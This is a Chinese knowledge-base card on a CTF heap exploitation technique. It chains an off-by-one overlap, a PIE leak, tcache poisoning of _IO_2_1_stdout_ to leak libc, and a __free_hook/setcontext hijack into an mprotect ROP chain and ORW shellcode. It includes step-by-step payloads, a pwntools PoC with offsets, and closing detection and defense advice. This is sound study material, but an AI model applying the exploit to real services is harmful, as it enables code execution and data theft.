---
id: binary-pwn-heap-offbyone-show-codebase-stdout-leak-freehook-mprotect-orw
title: 有 show 但只能读到代码段地址的 off-by-one 堆题：叠块 + tcache 打 _IO_2_1_stdout_ 泄 libc，再改 __free_hook 走 setcontext + mprotect 执行 ORW shellcode
type: scenario
domain: binary
path: binary/pwn/heap
technique: offbyone-show-codebase-stdout-leak-freehook-setcontext-mprotect-orw
aliases:
- show 泄露代码段而非 libc 的堆题
- off-by-one 叠块 + stdout 泄 libc
- free_hook setcontext mprotect shellcode ORW
- 禁用 execve 的堆题打法
- EZheap 类题
tags:
- pwn
- heap
- off-by-one
- tcache
- stdout
- free-hook
- setcontext
- mprotect
- orw
- seccomp
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W
  verified_at: '2026-11-08T17:21:26+08:00'
  notes: 已对照原文核对（edit off-by-one、show 泄代码段后减 0x202160、叠块 + tcache、0xfbad1800 改 _flags、libc 偏移 0x3ed8b0、__free_hook + setcontext+53、mprotect(0x1000,7) + jmp rsp + ORW 一致）；本次核对未读取图片，仅依据正文；原文 xp 里的落点 main_addr+0x202020 是 PIE 相对地址，卡中归纳为 _IO_2_1_stdout_ 属推断，未逐字段确认；glibc <2.34 前提已标注
---

## 一句话结论

题目提供了 `show`，但它读出的只是与堆叠块相邻的代码段指针（PIE 基址），拿不到 libc；此时用 off-by-one 把 tcache 块与 unsorted bin 块叠在同一段内存，再 tcache poisoning 把分配落到 `_IO_2_1_stdout_`、用 `0xfbad1800` 改写 `_flags` 扩大输出窗口泄出 libc；最后改 `__free_hook` 为 `setcontext+53`，在 hook 区布置 `mprotect(free_hook_page,0x1000,7)` + `jmp rsp` 的 ROP 与 shellcode，因为程序禁用了 `execve`，shellcode 必须走 `open/read/write` 的 ORW。

## 原理

- **off-by-one 是这类题的入口**：`edit` 允许写入比申请长度多一字节，能覆盖相邻 chunk 的 `size` 最低字节，把 small bin 的 size 改成更大/更小的值，从而在 `free` 后让两个 chunk 的可用区间重叠。
- **show 只能读代码段的原因**：`show` 打印的是 chunk 内容（按十六进制解析），而被读的那块在 `free` 后落进了与程序自身 `.bss`/全局区相邻的合并区，里面残留的是返回地址一类代码指针，减去固定偏移（原文 `0x202160`）即得 PIE 基址。它给不了 libc，所以必须另找泄 libc 的出口。
- **stdout 是非常规泄露出口**：`_IO_2_1_stdout_` 的 `_flags` 若被改成 `0xfbad1800`，`_IO_write_base` 会被当作输出起点、`_IO_write_ptr` 为终点，下一次 `printf`/`puts` 就会把 stdout 结构体附近（含 libc 指针）打印出来。需要先用 tcache poisoning 让 `malloc` 返回 `_IO_2_1_stdout_` 的地址，再 `edit` 覆写这几个字段。
- **`__free_hook` 是控制流劫持点**：glibc 2.34 之前 `free()` 会调用 `__free_hook`；把它改成 `setcontext+53` 后，下一次 `free` 就会执行 `setcontext` 中从 `rdi+0x??` 恢复寄存器的代码段，等价于「以堆上数据为上下文」恢复 RSP/RIP。
- **为什么要 mprotect + shellcode**：程序 seccomp 禁了 `execve`，`system`/one_gadget 全部失效。`setcontext` 恢复出的 ROP 链先 `mprotect` 把 `__free_hook` 所在页改为可写可执行，再 `jmp rsp` 跳到紧随其后的 shellcode；shellcode 用 `open("/flag")` + `read` + `write` 把内容打回 stdout，不依赖任何 libc 函数。
- 这条链的可复用点在于「泄 libc 的通道可以不是 show 而是 stdout 结构体」，很多题把 `show` 做成「只回显长度/地址」的限制型接口，此时 stdout 是通用替代。

## 触发条件

- 二进制有 `add/edit/free/show` 四件套，`edit` 存在 off-by-one（或多一字节写）。
- `show` 能读 chunk 内容但读到的不是 libc 指针（只有代码段/堆地址）。
- glibc 版本仍保留 `__free_hook`（< 2.34）。
- 程序有 seccomp 禁用 `execve`，需要 ORW。
- PIE 可泄（先拿到代码基址才能算 gadget 与 GOT 偏移）。

## 利用步骤

1. 用 off-by-one 制造重叠：`add(0,0x18)`、`add(1,0x68)`、`add(2,0x68)`、`add(3,0x18)`，`edit(0, b'\x00'*0x18 + p8(0xe1))` 把 chunk1 的 size 改大，再 `free(1)`；随后 `add(4,0xd8)` 让新块覆盖原 chunk2 头部。
2. `show(4)` 读出残留指针，按固定偏移减出 PIE 基址（原文 `int(io.recv(14),16) - 0x202160`）。
3. 清空 tcache 并把 freed chunk 链成可控：`free(2)` → `edit(4, b'\x00'*0x68 + p64(0x71) + p64(main_addr+0x202020))`，再三次 `add(5..7,0x68)` 把分配引到目标地址。
4. 改写 stdout 结构体：`edit(7, p64(0xfbad1800) + p64(0)*3 + b'\x00')`，随后读回显里带 `0x7f` 结尾的字节，减 `_IO_2_1_stdout_` 相对偏移（原文 `0x3ed8b0`）得 libc 基址。
5. 同样的叠块手法再打一次 `__free_hook`：`edit(8, ...)` 改 size、`free(9)`、`add(12,0xb8)` 覆盖、`edit(12, ... + p64(free_hook))`、`add(13/14,0x58)`、`edit(14, p64(setcontext+53))`。
6. 在 `__free_hook` 页上布置 ROP（`add(15,0x400)` 后 `edit(15, payload)`），payload 结构：
   - `p64(rdi) + p64(free_hook & ~0xfff)`
   - `p64(rsi) + p64(0x1000)`
   - `p64(rdx) + p64(7)`
   - `p64(rax) + p64(10)`（SYS_mprotect）
   - `p64(syscall)`
   - `p64(jmp_rsp)`
   - `asm(shellcraft.open('/flag')) + asm(shellcraft.read(3, free_hook+0x300, 0x30)) + asm(shellcraft.write(1, free_hook+0x300, 0x30))`
7. `free(15)` 触发 `__free_hook` → `setcontext` → 恢复栈 → `mprotect` → `jmp rsp` → shellcode 输出 flag。

## PoC

关键片段（偏移依目标 libc 调整）：

```python
# 1) off-by-one 造重叠，show 泄 PIE
add(0,0x18); add(1,0x68); add(2,0x68); add(3,0x18)
edit(0, b'\x00'*0x18 + p8(0xe1))
free(1)
add(4,0xd8)
show(4)
main_addr = int(io.recv(14), 16) - 0x202160

# 2) tcache 打 _IO_2_1_stdout_ 泄 libc
free(2)
edit(4, b'\x00'*0x68 + p64(0x71) + p64(main_addr+0x202020))
add(5,0x68); add(6,0x68); add(7,0x68)
edit(7, p64(0xfbad1800) + p64(0)*3 + b'\x00')
libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x3ed8b0

# 3) 改 __free_hook = setcontext+53，布置 mprotect(7) + jmp rsp + ORW shellcode
free_hook = libc_base + libc.sym['__free_hook']
payload = (b'\x00'*0x68 + p64(0) + p64(free_hook & 0xfffffffffffff000) + p64(0)*2 + p64(0x2000)).ljust(0xa0, b'\x00') + p64(free_hook & 0xfffffffffffff000) + p64(syscall)
# ……add/edit 链省略，见「利用步骤」5-6……
free(15)
```

## 变体与关联

- 变体：能泄 libc 就别绕 stdout——直接 `show` 一个 free 后进 unsorted bin 的块，读 `main_arena+96` 更省事；本卡的 stdout 路线用于「show 被做成只回显代码指针」的题。
- 变体：`__free_hook` 在 glibc ≥2.34 已被移除，改打 `_IO_list_all`/`_IO_2_1_stdout_` 的 FSOP 或 `setcontext` 前的 exit handler。
- 变体：没有 `jmp rsp` gadget 时，可用 `setcontext` 直接恢复一个 ROP 栈而不切 shellcode；有 `mprotect` 后也可改成 `read` 读入第二阶段。
- 关联：[[binary-pwn-heap-stdout-partial-overwrite-libc-leak]]（stdout 泄露的更细字段操作）。
- 关联：[[binary-pwn-heap-freehook-setcontext61-bridge-orw]]（`__free_hook` + `setcontext` + ORW 的另一形态，桥接 gadget 不同）。
- 关联：[[ctf-pwn-offbyone-tcache-stdout-leak-mprotect-orw-sandbox]]（同族「off-by-one + stdout + ORW」，但那条无 `show`、靠 unsorted bin 泄 libc；本条是先泄 PIE 再泄 libc 的两段式）。

## 检测与防御

- 防御（出题/加固）：`edit` 的长度必须严格等于申请长度；把 `show` 完全关掉或只回显长度；`malloc` 后 `memset` 防残留泄露；glibc 升级到移除 `__free_hook` 的版本；seccomp 之外再加 `no_new_privs` 与只读挂载。
- 检测（真实服务）：进程出现异常大的 `mprotect` 调用把堆页改为 RWX（`mprotect` 的 prot 含 `PROT_EXEC` 是强特征）；`__free_hook` 被写；stdout 的 `_flags` 出现 `0xfbad1800` 类非法值；进程连续 `open("/flag")` 后 `write` 到 stdout。
- 响应：隔离该进程、dump 堆内 payload 分析、若有 seccomp 逃逸迹象则审计内核与容器配置。
